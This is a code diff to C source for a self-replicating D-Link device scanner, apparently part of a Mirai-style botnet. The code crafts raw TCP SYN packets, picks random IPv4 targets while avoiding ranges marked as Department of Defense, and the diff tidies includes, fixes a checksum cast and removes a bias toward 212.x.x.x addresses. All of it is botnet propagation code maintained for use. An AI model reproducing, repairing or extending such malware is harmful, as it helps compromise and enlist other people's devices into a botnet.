@@ -14,19 +14,17 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 #include "includes.h"
 #include "selfrep_dlink.h"
-#include "selfrep_table.h"
-#include "selfrep_rand.h"
-#include "selfrep_util.h"
-#include "selfrep_checksum.h"
+#include "table.h"
+#include "rand.h"
+#include "util.h"
+#include "checksum.h"
 
 int dlinkscanner_scanner_pid = 0, dlinkscanner_rsck = 0, dlinkscanner_rsck_out = 0;
 char dlinkscanner_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct dlinkscanner_scanner_connection *conn_table;
+static struct dlinkscanner_scanner_connection *conn_table;
 uint32_t dlinkscanner_fake_time = 0;
 
 int dlinkscanner_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -61,7 +59,6 @@ void dlinkscanner_scanner_init(void)
     if(dlinkscanner_scanner_pid > 0 || dlinkscanner_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     dlinkscanner_fake_time = time(NULL);
@@ -154,7 +151,7 @@ void dlinkscanner_scanner_init(void)
                 }
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -449,19 +446,6 @@ static ipv4_t dlinkscanner_get_random_ip(void)
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
 
-    	int randnum = rand() % 2;
-	if (randnum == 0)
-	{
-		return INET_ADDR(212,o2,o3,o4);
-	}
-	if (randnum == 1)
-	{
-		return INET_ADDR(o1,o2,o3,o4);
-	}
-	if (randnum == 2)
-	{
-		return INET_ADDR(o1,o2,o3,o4);
-	}
-
+    return INET_ADDR(o1, o2, o3, o4);
 }
 
